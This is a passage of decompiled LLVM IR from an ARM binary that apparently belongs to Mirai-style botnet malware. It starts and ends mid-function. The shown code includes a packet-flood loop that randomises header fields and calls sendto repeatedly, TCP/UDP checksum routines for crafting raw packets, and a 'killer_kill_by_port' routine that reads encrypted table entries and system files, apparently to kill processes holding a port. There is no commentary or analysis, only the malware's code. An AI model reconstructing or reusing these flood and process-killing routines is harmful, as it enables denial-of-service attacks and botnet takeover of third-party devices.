  store i32 %v5_c730, i32* %lr.global-to-local, align 4
  %v0_c734 = load i32, i32* @r6, align 4
  %v1_c734 = add i32 %v0_c734, 2
  %v2_c734 = inttoptr i32 %v1_c734 to i16*
  %v3_c734 = load i16, i16* %v2_c734, align 2
  %v4_c734 = zext i16 %v3_c734 to i32
  store i32 %v4_c734, i32* @r6, align 4
  %v1_c738 = load i32, i32* @r8, align 4
  %v2_c738 = add i32 %v1_c738, %v5_c730
  store i32 %v2_c738, i32* @lr, align 4
  %v3_c73c = add i32 %v2_c738, 2
  %v4_c73c = inttoptr i32 %v3_c73c to i16*
  store i16 %v3_c734, i16* %v4_c73c, align 2
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_c748 = load i32, i32* @r5, align 4
  store i32 %v0_c748, i32* %r1.global-to-local, align 4
  %v0_c74c = load i32, i32* @sl, align 4
  store i32 %v0_c74c, i32* %r0.global-to-local, align 4
  store i32 60, i32* %r2.global-to-local, align 4
  %v0_c754 = load i32, i32* @lr, align 4
  %v6_c75c = call i32 @__libc_sendto(i32 %v0_c74c, i32 %v0_c748, i32 60, i32 16384, i32 %v0_c754, i32 16)
  %v3_c760 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_c760, i32* %r3.global-to-local, align 4
  %v1_c764 = add i32 %v3_c760, 1
  store i32 %v1_c764, i32* %r0.global-to-local, align 4
  %v1_c768 = load i32, i32* @r7, align 4
  %v9_c768 = icmp eq i32 %v1_c764, %v1_c768
  store i1 %v9_c768, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_c764, i32* %stack_var_-44, align 4
  %v5_c770 = icmp slt i32 %v1_c764, %v1_c768
  br i1 %v5_c770, label %dec_label_pc_c678, label %dec_label_pc_c774

dec_label_pc_c774:                                ; preds = %dec_label_pc_c6f0
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_c778 = icmp eq i32 %v1_c768, 0
  store i1 %v2_c778, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_c778, label %dec_label_pc_c664, label %dec_label_pc_c674

dec_label_pc_c788:                                ; preds = %dec_label_pc_c678
  %v1_c788 = add i32 %v2_c680, 16
  %v2_c788 = inttoptr i32 %v1_c788 to i32*
  %v3_c788 = load i32, i32* %v2_c788, align 4
  store i32 %v3_c788, i32* %r4.global-to-local, align 4
  %v0_c78c = call i32 @rand_next()
  store i32 %v0_c78c, i32* %r0.global-to-local, align 4
  %v3_c790 = load i32, i32* %stack_var_-44, align 4
  %v5_c798 = mul i32 %v3_c790, 24
  %v0_c79c = load i32, i32* %r4.global-to-local, align 4
  %v1_c79c = and i32 %v0_c79c, 16711680
  %v3_c7a0 = udiv i32 %v0_c79c, 16777216
  %v4_c7a4 = udiv i32 %v1_c79c, 256
  %v5_c7a4 = or i32 %v4_c7a4, %v3_c7a0
  store i32 %v5_c7a4, i32* %r2.global-to-local, align 4
  %v1_c7a8 = load i32, i32* @r8, align 4
  %v2_c7a8 = add i32 %v1_c7a8, %v5_c798
  store i32 %v2_c7a8, i32* %r1.global-to-local, align 4
  %v1_c7ac = and i32 %v0_c79c, 65280
  store i32 %v1_c7ac, i32* %r3.global-to-local, align 4
  %v1_c7b0 = add i32 %v2_c7a8, 20
  %v2_c7b0 = inttoptr i32 %v1_c7b0 to i8*
  %v3_c7b0 = load i8, i8* %v2_c7b0, align 1
  %v4_c7b0 = zext i8 %v3_c7b0 to i32
  %v5_c7b8 = call i32 @llvm.bswap.i32(i32 %v0_c79c)
  %v7_c7bc = lshr i32 %v0_c78c, %v4_c7b0
  %v8_c7bc = add i32 %v7_c7bc, %v5_c7b8
  store i32 %v8_c7bc, i32* %r2.global-to-local, align 4
  %v1_c7c0 = and i32 %v8_c7bc, 16711680
  store i32 %v1_c7c0, i32* %r0.global-to-local, align 4
  %v1_c7cc = and i32 %v8_c7bc, 65280
  store i32 %v1_c7cc, i32* %r1.global-to-local, align 4
  %v5_c7d4 = call i32 @llvm.bswap.i32(i32 %v8_c7bc)
  %v1_c7d8 = load i32, i32* @r5, align 4
  %v2_c7d8 = add i32 %v1_c7d8, 16
  %v3_c7d8 = inttoptr i32 %v2_c7d8 to i32*
  store i32 %v5_c7d4, i32* %v3_c7d8, align 4
  store i32 %v6_c38c, i32* %r3.global-to-local, align 4
  store i1 %v8_c7e0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_c7e0, label %dec_label_pc_c7e8, label %dec_label_pc_c6a4

dec_label_pc_c7e8:                                ; preds = %dec_label_pc_c788, %dec_label_pc_c698
  %v0_c7e8 = call i32 @rand_next()
  store i32 65536, i32* %r4.global-to-local, align 4
  %v1_c7f0 = load i32, i32* @r5, align 4
  %v2_c7f0 = add i32 %v1_c7f0, 12
  %v3_c7f0 = inttoptr i32 %v2_c7f0 to i32*
  store i32 %v0_c7e8, i32* %v3_c7f0, align 4
  store i32 %v3_c3f4, i32* %r0.global-to-local, align 4
  %v0_c7f8 = load i32, i32* %r4.global-to-local, align 4
  %v1_c7f8 = add i32 %v0_c7f8, -1
  store i32 %v1_c7f8, i32* @r4, align 4
  %v9_c7fc = icmp eq i32 %v3_c3f4, %v1_c7f8
  store i1 %v9_c7fc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_c7fc, label %dec_label_pc_c804, label %dec_label_pc_c6b8

dec_label_pc_c804:                                ; preds = %dec_label_pc_c7e8, %dec_label_pc_c6a4
  %v0_c804 = call i32 @rand_next()
  %v1_c804 = trunc i32 %v0_c804 to i16
  store i32 %v0_c804, i32* %r0.global-to-local, align 4
  store i32 %v3_c3f8, i32* %r1.global-to-local, align 4
  %v1_c80c = load i32, i32* @r4, align 4
  %v9_c80c = icmp eq i32 %v3_c3f8, %v1_c80c
  store i1 %v9_c80c, i1* %cpsr_z.global-to-local, align 1
  %v3_c810 = load i32, i32* @r5, align 4
  %v4_c810 = add i32 %v3_c810, 4
  %v5_c810 = inttoptr i32 %v4_c810 to i16*
  store i16 %v1_c804, i16* %v5_c810, align 2
  br i1 %v9_c80c, label %dec_label_pc_c818, label %dec_label_pc_c804.dec_label_pc_c6c4_crit_edge

dec_label_pc_c804.dec_label_pc_c6c4_crit_edge:    ; preds = %dec_label_pc_c804
  %v1_c6c8.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_c6c4

dec_label_pc_c818:                                ; preds = %dec_label_pc_c804, %dec_label_pc_c6b8
  %v0_c818 = call i32 @rand_next()
  %v1_c818 = trunc i32 %v0_c818 to i16
  store i32 %v0_c818, i32* %r0.global-to-local, align 4
  store i32 %v3_c3fc, i32* %r2.global-to-local, align 4
  %v1_c820 = load i32, i32* @r4, align 4
  %v9_c820 = icmp eq i32 %v3_c3fc, %v1_c820
  store i1 %v9_c820, i1* %cpsr_z.global-to-local, align 1
  %v3_c824 = load i32, i32* @r5, align 4
  %v4_c824 = add i32 %v3_c824, 20
  %v5_c824 = inttoptr i32 %v4_c824 to i16*
  store i16 %v1_c818, i16* %v5_c824, align 2
  br i1 %v9_c820, label %dec_label_pc_c82c, label %dec_label_pc_c818.dec_label_pc_c6d0_crit_edge

dec_label_pc_c818.dec_label_pc_c6d0_crit_edge:    ; preds = %dec_label_pc_c818
  %v1_c6d4.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_c6d0

dec_label_pc_c82c:                                ; preds = %dec_label_pc_c818, %dec_label_pc_c6c4
  %v0_c82c = call i32 @rand_next()
  %v1_c82c = trunc i32 %v0_c82c to i16
  store i32 %v0_c82c, i32* %r0.global-to-local, align 4
  store i32 %v5_c2c8, i32* %r3.global-to-local, align 4
  %v1_c834 = load i32, i32* @r4, align 4
  %v9_c834 = icmp eq i32 %v5_c2c8, %v1_c834
  store i1 %v9_c834, i1* %cpsr_z.global-to-local, align 1
  %v3_c838 = load i32, i32* @r6, align 4
  %v4_c838 = add i32 %v3_c838, 2
  %v5_c838 = inttoptr i32 %v4_c838 to i16*
  store i16 %v1_c82c, i16* %v5_c838, align 2
  br i1 %v9_c834, label %dec_label_pc_c840, label %dec_label_pc_c82c.dec_label_pc_c6dc_crit_edge

dec_label_pc_c82c.dec_label_pc_c6dc_crit_edge:    ; preds = %dec_label_pc_c82c
  %v1_c6e0.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_c6dc

dec_label_pc_c840:                                ; preds = %dec_label_pc_c82c, %dec_label_pc_c6d0
  %v0_c840 = call i32 @rand_next()
  %v1_c844 = load i32, i32* @r6, align 4
  %v2_c844 = add i32 %v1_c844, 4
  %v3_c844 = inttoptr i32 %v2_c844 to i32*
  store i32 %v0_c840, i32* %v3_c844, align 4
  store i32 %v6_c2e0, i32* %r0.global-to-local, align 4
  %v1_c84c = load i32, i32* @r4, align 4
  %v9_c84c = icmp eq i32 %v6_c2e0, %v1_c84c
  store i1 %v9_c84c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_c84c, label %dec_label_pc_c854, label %dec_label_pc_c6e8

dec_label_pc_c854:                                ; preds = %dec_label_pc_c840, %dec_label_pc_c6dc
  %v0_c854 = call i32 @rand_next()
  store i32 %v0_c854, i32* %r0.global-to-local, align 4
  %v0_c858 = load i32, i32* @fp, align 4
  %v2_c858 = icmp eq i32 %v0_c858, 0
  store i1 %v2_c858, i1* %cpsr_z.global-to-local, align 1
  %v1_c85c = load i32, i32* @r6, align 4
  %v2_c85c = add i32 %v1_c85c, 8
  %v3_c85c = inttoptr i32 %v2_c85c to i32*
  store i32 %v0_c854, i32* %v3_c85c, align 4
  br i1 %v2_c858, label %dec_label_pc_c6f0, label %dec_label_pc_c864

dec_label_pc_c864:                                ; preds = %dec_label_pc_c6e8, %dec_label_pc_c854
  %v0_c864 = call i32 @rand_next()
  %v1_c864 = trunc i32 %v0_c864 to i16
  store i32 %v0_c864, i32* %r0.global-to-local, align 4
  %v3_c868 = load i32, i32* @r6, align 4
  %v4_c868 = add i32 %v3_c868, 18
  %v5_c868 = inttoptr i32 %v4_c868 to i16*
  store i16 %v1_c864, i16* %v5_c868, align 2
  br label %dec_label_pc_c6f0

dec_label_pc_c870:                                ; preds = %dec_label_pc_c3b0
  %v0_c870 = load i32, i32* @sl, align 4
  store i32 %v0_c870, i32* %r0.global-to-local, align 4
  %v1_c874 = call i32 @__GI___libc_close(i32 %v0_c870)
  store i32 %v1_c874, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_c878

dec_label_pc_c878:                                ; preds = %entry, %dec_label_pc_c870
  %v1_c880 = phi i32 [ %v3_c3a0, %entry ], [ %v1_c874, %dec_label_pc_c870 ]
  store i32 %v3_c1dc, i32* %r4.global-to-local, align 4
  store i32 %v24_c1dc, i32* %fp.global-to-local, align 4
  store i32 %v27_c1dc, i32* %lr.global-to-local, align 4
  ret i32 %v1_c880

; uselistorder directives
  uselistorder i32 %v0_c864, { 1, 0 }
  uselistorder i32 %v0_c82c, { 1, 0 }
  uselistorder i32 %v0_c818, { 1, 0 }
  uselistorder i32 %v0_c804, { 1, 0 }
  uselistorder i32 %v1_c7f8, { 1, 2, 0 }
  uselistorder i32 %v0_c79c, { 1, 2, 0, 3 }
  uselistorder i32 %v1_c764, { 2, 0, 3, 4, 1 }
  uselistorder i32 %v5_c730, { 1, 0 }
  uselistorder i32 %v4_c720, { 1, 0 }
  uselistorder i1 %v3_c6b0, { 1, 0 }
  uselistorder i32 %v2_c654, { 1, 0, 2, 3 }
  uselistorder i32 %v0_c4bc, { 1, 2, 0 }
  uselistorder i32 %v1_c488, { 2, 1, 0 }
  uselistorder i32 %v1_c484, { 2, 0, 1 }
  uselistorder i32 %v1_c480, { 2, 0, 1 }
  uselistorder i32 %v1_c47c, { 2, 0, 1 }
  uselistorder i32 %v1_c458, { 1, 0 }
  uselistorder i32 %v3_c3f4, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v0_c3e8, { 1, 0, 2 }
  uselistorder i32 %v0_c3e4, { 1, 0, 3, 2 }
  uselistorder i1 %v7_c3d0, { 1, 0 }
  uselistorder i1 %v7_c3a4, { 1, 0 }
  uselistorder i32 %v3_c3a0, { 1, 2, 3, 0, 4 }
  uselistorder i32 %v6_c38c, { 4, 3, 0, 5, 2, 1 }
  uselistorder i32 %v6_c2e0, { 3, 2, 1, 0 }
  uselistorder i32 %v5_c2c8, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v6_c24c, { 1, 0 }
  uselistorder i32 %v7_c234, { 0, 1, 3, 2 }
  uselistorder i32* %stack_var_-44, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 11, 10 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 5, 4, 6, 7, 8, 9, 10, 11, 12, 16, 13, 14, 15, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 25, 24, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 26, 25, 27, 28, 29, 30, 31, 32, 34, 33, 35, 36, 37, 39, 38, 41, 40, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 1, 3, 5, 4, 6, 8, 9, 7, 10, 12, 11, 13, 15, 14, 16, 17, 18, 21, 19, 20, 22, 23, 24, 25, 26, 27, 28, 32, 29, 30, 31, 33, 35, 34, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 0 }
  uselistorder i8 4, { 1, 0 }
  uselistorder i32 (i32, i32*, i32, i32)* @attack_get_opt_int, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 106, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_c878, { 1, 0 }
  uselistorder label %dec_label_pc_c864, { 1, 0 }
  uselistorder label %dec_label_pc_c6f0, { 2, 1, 0 }
  uselistorder label %dec_label_pc_c674, { 1, 0 }
  uselistorder label %dec_label_pc_c664, { 1, 0, 2 }
  uselistorder label %bb61, { 1, 0 }
  uselistorder label %bb59, { 1, 0 }
}

define i32 @checksum_generic(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = or i32 %arg1, 1
  %tmp9 = icmp eq i32 %tmp, 1
  br i1 %tmp9, label %dec_label_pc_c8ac, label %dec_label_pc_c894

dec_label_pc_c894:                                ; preds = %entry
  %v0_c89c.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_c898

dec_label_pc_c898:                                ; preds = %dec_label_pc_c898, %dec_label_pc_c894
  %v0_c8a4 = phi i32 [ %v2_c8a4, %dec_label_pc_c898 ], [ 0, %dec_label_pc_c894 ]
  %v0_c89c = phi i32 [ %v5_c89c, %dec_label_pc_c898 ], [ %v0_c89c.pre, %dec_label_pc_c894 ]
  %v0_c898 = phi i32 [ %v1_c898, %dec_label_pc_c898 ], [ %arg1, %dec_label_pc_c894 ]
  %v1_c898 = add i32 %v0_c898, -2
  %v1_c89c = inttoptr i32 %v0_c89c to i16*
  %v2_c89c = load i16, i16* %v1_c89c, align 2
  %v3_c89c = zext i16 %v2_c89c to i32
  %v5_c89c = add i32 %v0_c89c, -2
  store i32 %v5_c89c, i32* @r0, align 4
  %v2_c8a4 = add i32 %v3_c89c, %v0_c8a4
  %v1_c898.cmp = icmp ugt i32 %v1_c898, 1
  br i1 %v1_c898.cmp, label %dec_label_pc_c898, label %dec_label_pc_c8ac.loopexit

dec_label_pc_c8ac.loopexit:                       ; preds = %dec_label_pc_c898
  br label %dec_label_pc_c8ac

dec_label_pc_c8ac:                                ; preds = %entry, %dec_label_pc_c8ac.loopexit
  %v1_c8b4 = phi i32 [ %v2_c8a4, %dec_label_pc_c8ac.loopexit ], [ 0, %entry ]
  %v0_c8ac = phi i32 [ %v1_c898, %dec_label_pc_c8ac.loopexit ], [ %arg1, %entry ]
  %v7_c8ac = icmp eq i32 %v0_c8ac, 1
  br i1 %v7_c8ac, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_c8ac
  %v1_c8b0 = load i32, i32* @r0, align 4
  %v2_c8b0 = inttoptr i32 %v1_c8b0 to i8*
  %v3_c8b0 = load i8, i8* %v2_c8b0, align 1
  %v4_c8b0 = zext i8 %v3_c8b0 to i32
  %v3_c8b4 = add i32 %v1_c8b4, %v4_c8b0
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_c8ac, %bb
  %v0_c8b8 = phi i32 [ %v1_c8b4, %dec_label_pc_c8ac ], [ %v3_c8b4, %bb ]
  %v3_c8bc = urem i32 %v0_c8b8, 65536
  %v4_c8c0 = udiv i32 %v0_c8b8, 65536
  %v5_c8c0 = add nuw nsw i32 %v4_c8c0, %v3_c8bc
  %v4_c8c4 = udiv i32 %v5_c8c0, 65536
  %v5_c8c4 = add nuw nsw i32 %v4_c8c4, %v5_c8c0
  %v1_c8c8 = urem i32 %v5_c8c4, 65536
  %v3_c8d0 = xor i32 %v1_c8c8, 65535
  ret i32 %v3_c8d0

; uselistorder directives
  uselistorder i32 %v5_c8c0, { 1, 0 }
  uselistorder i32 %v5_c89c, { 1, 0 }
  uselistorder i32 %v1_c898, { 1, 0, 2 }
  uselistorder i32 %v0_c89c, { 1, 0 }
  uselistorder i32 %arg1, { 1, 2, 0 }
  uselistorder label %.thread, { 1, 0 }
  uselistorder label %dec_label_pc_c8ac, { 1, 0 }
}

define i32 @checksum_tcpudp(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v1_c8e8 = add i32 %arg1, 12
  %v2_c8e8 = inttoptr i32 %v1_c8e8 to i32*
  %v3_c8e8 = load i32, i32* %v2_c8e8, align 4
  %v1_c8ec = add i32 %arg1, 16
  %v2_c8ec = inttoptr i32 %v1_c8ec to i32*
  %v3_c8ec = load i32, i32* %v2_c8ec, align 4
  %v7_c8f0 = icmp sgt i32 %arg3, 1
  br i1 %v7_c8f0, label %dec_label_pc_c8fc.preheader, label %dec_label_pc_c910

dec_label_pc_c8fc.preheader:                      ; preds = %entry
  %v0_c900.pre = load i32, i32* @r1, align 4
  br label %dec_label_pc_c8fc

dec_label_pc_c8fc:                                ; preds = %dec_label_pc_c8fc.preheader, %dec_label_pc_c8fc
  %v0_c908 = phi i32 [ 0, %dec_label_pc_c8fc.preheader ], [ %v2_c908, %dec_label_pc_c8fc ]
  %v0_c900 = phi i32 [ %v0_c900.pre, %dec_label_pc_c8fc.preheader ], [ %v5_c900, %dec_label_pc_c8fc ]
  %v0_c8fc = phi i32 [ %arg3, %dec_label_pc_c8fc.preheader ], [ %v1_c8fc, %dec_label_pc_c8fc ]
  %v1_c8fc = add nsw i32 %v0_c8fc, -2
  %v1_c900 = inttoptr i32 %v0_c900 to i16*
  %v2_c900 = load i16, i16* %v1_c900, align 2
  %v3_c900 = zext i16 %v2_c900 to i32
  %v5_c900 = add i32 %v0_c900, -2
  store i32 %v5_c900, i32* @r1, align 4
  %v2_c908 = add i32 %v3_c900, %v0_c908
  %v8_c90c = icmp sgt i32 %v1_c8fc, 1
  br i1 %v8_c90c, label %dec_label_pc_c8fc, label %dec_label_pc_c910.loopexit

dec_label_pc_c910.loopexit:                       ; preds = %dec_label_pc_c8fc
  br label %dec_label_pc_c910

dec_label_pc_c910:                                ; preds = %dec_label_pc_c910.loopexit, %entry
  %v1_c91c = phi i32 [ %v2_c908, %dec_label_pc_c910.loopexit ], [ 0, %entry ]
  %v0_c910 = phi i32 [ %v1_c8fc, %dec_label_pc_c910.loopexit ], [ %arg3, %entry ]
  %v7_c910 = icmp eq i32 %v0_c910, 1
  br i1 %v7_c910, label %bb, label %.thread

.thread:                                          ; preds = %dec_label_pc_c910
  br label %bb19

bb:                                               ; preds = %dec_label_pc_c910
  %v1_c914 = load i32, i32* @r1, align 4
  %v2_c914 = inttoptr i32 %v1_c914 to i8*
  %v3_c914 = load i8, i8* %v2_c914, align 1
  %v4_c914 = zext i8 %v3_c914 to i32
  %v3_c91c = add i32 %v4_c914, %v1_c91c
  br label %bb19

bb19:                                             ; preds = %.thread, %bb
  %v1_c944 = phi i32 [ %v1_c91c, %.thread ], [ %v3_c91c, %bb ]
  %v0_c924 = mul i32 %v3_c8e8, 65536
  %v3_c924 = udiv i32 %v0_c924, 65536
  %v3_c928 = urem i32 %v3_c8ec, 65536
  %v4_c930 = udiv i32 %v3_c8e8, 65536
  %v2_c92c = add nuw nsw i32 %v3_c928, %v4_c930
  %v5_c930 = add nuw nsw i32 %v2_c92c, %v3_c924
  %v1_c934 = add i32 %arg1, 9
  %v2_c934 = inttoptr i32 %v1_c934 to i8*
  %v3_c934 = load i8, i8* %v2_c934, align 1
  %v4_c934 = zext i8 %v3_c934 to i32
  %v4_c938 = udiv i32 %v3_c8ec, 65536
  %v3_c940 = mul nuw nsw i32 %v4_c934, 256
  %v5_c938 = add i32 %v4_c938, %arg2
  %v2_c93c = add i32 %v5_c938, %v1_c944
  %v2_c944 = add i32 %v2_c93c, %v5_c930
  %v2_c948 = add i32 %v2_c944, %v3_c940
  %tmp = icmp ult i32 %v2_c948, 65536
  br i1 %tmp, label %dec_label_pc_c968, label %dec_label_pc_c954

dec_label_pc_c954:                                ; preds = %bb19, %dec_label_pc_c954
  %v2_c95c5 = phi i32 [ %v2_c95c, %dec_label_pc_c954 ], [ %v2_c948, %bb19 ]
  %v3_c9606.in = phi i32 [ %v2_c95c, %dec_label_pc_c954 ], [ %v2_c948, %bb19 ]
  %v3_c9606 = udiv i32 %v3_c9606.in, 65536
  %v3_c958 = urem i32 %v2_c95c5, 65536
  %v2_c95c = add nuw nsw i32 %v3_c958, %v3_c9606
  %tmp20 = icmp ult i32 %v2_c95c, 65536
  br i1 %tmp20, label %dec_label_pc_c968.loopexit, label %dec_label_pc_c954

dec_label_pc_c968.loopexit:                       ; preds = %dec_label_pc_c954
  br label %dec_label_pc_c968

dec_label_pc_c968:                                ; preds = %dec_label_pc_c968.loopexit, %bb19
  %v0_c968 = phi i32 [ %v2_c95c, %dec_label_pc_c968.loopexit ], [ %v2_c948, %bb19 ]
  %v1_c968 = urem i32 %v0_c968, 65536
  %v3_c970 = xor i32 %v1_c968, 65535
  ret i32 %v3_c970

; uselistorder directives
  uselistorder i32 %v2_c95c, { 2, 1, 3, 0 }
  uselistorder i32 %v2_c948, { 3, 0, 2, 1 }
  uselistorder i32 %v1_c91c, { 1, 0 }
  uselistorder i32 %v5_c900, { 1, 0 }
  uselistorder i32 %v0_c900, { 1, 0 }
  uselistorder i32 %v3_c8e8, { 1, 0 }
  uselistorder i32 %arg3, { 2, 1, 0 }
  uselistorder i32 %arg1, { 0, 2, 1 }
  uselistorder label %dec_label_pc_c954, { 1, 0 }
  uselistorder label %bb19, { 1, 0 }
  uselistorder label %dec_label_pc_c8fc, { 1, 0 }
}

define i32 @killer_kill_by_port(i32 %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-72 = alloca i8, align 1
  %stack_var_-4681 = alloca i32, align 4
  %stack_var_-8777 = alloca i32, align 4
  %stack_var_-585 = alloca i8, align 1
  %v3_c97c = load i32, i32* @r4, align 4
  %v6_c97c = load i32, i32* @r5, align 4
  %v9_c97c = load i32, i32* @r6, align 4
  %v12_c97c = load i32, i32* @r7, align 4
  %v15_c97c = load i32, i32* @r8, align 4
  %v18_c97c = load i32, i32* @sb, align 4
  %v21_c97c = load i32, i32* @sl, align 4
  %v24_c97c = load i32, i32* @fp, align 4
  %v27_c97c = load i32, i32* @lr, align 4
  store i32 0, i32* @r5, align 4
  %v2_c998 = ptrtoint i8* %stack_var_-585 to i32
  store i32 %v2_c998, i32* @r6, align 4
  store i32 0, i32* %stack_var_-56, align 4
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %v2_c9c4 = ptrtoint i32* %stack_var_-8777 to i32
  store i32 %v2_c9c4, i32* @fp, align 4
  %v4_c9d0 = call i32 @__GI_memset(i8* nonnull %stack_var_-585, i32 0, i32 513)
  %v2_c9d4 = ptrtoint i32* %stack_var_-4681 to i32
  store i32 %v2_c9d4, i32* @sl, align 4
  %v0_c9d8 = load i32, i32* @r5, align 4
  %v3_c9e4 = bitcast i32* %stack_var_-8777 to i8*
  %v4_c9e4 = call i32 @__GI_memset(i8* %v3_c9e4, i32 %v0_c9d8, i32 4096)
  %v0_c9ec = load i32, i32* @r5, align 4
  %v3_c9f8 = bitcast i32* %stack_var_-4681 to i8*
  %v4_c9f8 = call i32 @__GI_memset(i8* %v3_c9f8, i32 %v0_c9ec, i32 4096)
  %v2_c9fc = ptrtoint i8* %stack_var_-72 to i32
  store i32 %v2_c9fc, i32* @sb, align 4
  %v0_ca00 = load i32, i32* %r4.global-to-local, align 4
  %v3_ca00 = udiv i32 %v0_ca00, 256
  %v1_ca04 = urem i32 %v0_ca00, 256
  store i32 %v1_ca04, i32* @r4, align 4
  %v3_ca14 = trunc i32 %v3_ca00 to i8
  %v4_ca14 = call i32 @util_itoa(i8 %v3_ca14, i32 16, i32 %v2_c9fc)
  %v2_ca1c = call i32 @util_strlen(i8* nonnull %stack_var_-72)
  %v7_ca20 = icmp eq i32 %v2_ca1c, 2
  br i1 %v7_ca20, label %dec_label_pc_cee4, label %dec_label_pc_ca28

dec_label_pc_ca28:                                ; preds = %entry, %dec_label_pc_cee4
  %v1_ca2c = call i32 @table_unlock_val(i32 13)
  %v1_ca34 = call i32 @table_unlock_val(i32 14)
  %v1_ca3c = call i32 @table_unlock_val(i32 15)
  %v1_ca44 = call i32 @table_unlock_val(i32 17)
  %v0_ca48 = load i32, i32* @r5, align 4
  %v2_ca50 = inttoptr i32 %v0_ca48 to i32*
  %v3_ca50 = call i32 @table_retrieve_val(i32 17, i32* %v2_ca50)
  %v0_ca54 = load i32, i32* @r5, align 4
  %v2_ca58 = call i32 @__libc_open(i32 %v3_ca50, i32 %v0_ca54)
  %v7_ca5c = icmp eq i32 %v2_ca58, -1
  store i32 %v2_ca58, i32* @r8, align 4
  br i1 %v7_ca5c, label %bb, label %dec_label_pc_ca6c.preheader

bb:                                               ; preds = %dec_label_pc_ca28
  %v1_ca64 = load i32, i32* @r5, align 4
  store i32 %v1_ca64, i32* @r4, align 4
  br label %dec_label_pc_ce80

dec_label_pc_ca6c.preheader:                      ; preds = %dec_label_pc_ca28
  %v4_ca7856 = call i32 @util_fdgets(i8* nonnull %stack_var_-585, i32 512, i32 %v2_ca58)
  %v2_ca7c58 = icmp eq i32 %v4_ca7856, 0
  br i1 %v2_ca7c58, label %dec_label_pc_cc04.loopexit, label %dec_label_pc_ca84.lr.ph

dec_label_pc_ca84.lr.ph:                          ; preds = %dec_label_pc_ca6c.preheader
  %v2_cacc = ptrtoint i32* %stack_var_-40 to i32
  br label %dec_label_pc_ca84

dec_label_pc_ca84:                                ; preds = %dec_label_pc_ca84.lr.ph, %dec_label_pc_ca6c.backedge
  %v3_ca88 = load i8, i8* %stack_var_-585, align 1
  %v4_ca88 = sext i8 %v3_ca88 to i32
  store i32 %v4_ca88, i32* @r3, align 4
  %v2_ca8c = icmp eq i8 %v3_ca88, 0
  br i1 %v2_ca8c, label %bb126, label %bb125

bb125:                                            ; preds = %dec_label_pc_ca84
  %v8_ca90 = icmp eq i8 %v3_ca88, 58
  br i1 %v8_ca90, label %.thread8, label %dec_label_pc_caa4

.thread8:                                         ; preds = %bb125
  br label %dec_label_pc_cabc

bb126:                                            ; preds = %dec_label_pc_ca84
  br label %dec_label_pc_cabc

dec_label_pc_caa4:                                ; preds = %bb125
  %v1_caac.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_caa8

dec_label_pc_caa8:                                ; preds = %bb127, %dec_label_pc_caa4
  %v0_caa8 = phi i32 [ %v1_caa8, %bb127 ], [ 0, %dec_label_pc_caa4 ]
  %v1_caa8 = add i32 %v0_caa8, 1
  %v2_caac = add i32 %v1_caa8, %v1_caac.pre
  %v3_caac = inttoptr i32 %v2_caac to i8*
  %v4_caac = load i8, i8* %v3_caac, align 1
  %v6_caac = zext i8 %v4_caac to i32
  store i32 %v6_caac, i32* @r3, align 4
  %v2_cab0 = icmp eq i8 %v4_caac, 0
  br i1 %v2_cab0, label %dec_label_pc_cabc, label %bb127

bb127:                                            ; preds = %dec_label_pc_caa8
  %v8_cab4 = icmp eq i8 %v4_caac, 58
  br i1 %v8_cab4, label %dec_label_pc_cabc, label %dec_label_pc_caa8

dec_label_pc_cabc:                                ; preds = %dec_label_pc_caa8, %bb127, %bb126, %.thread8
  %v1_cae8 = phi i32 [ 0, %.thread8 ], [ 0, %bb126 ], [ %v1_caa8, %bb127 ], [ %v1_caa8, %dec_label_pc_caa8 ]
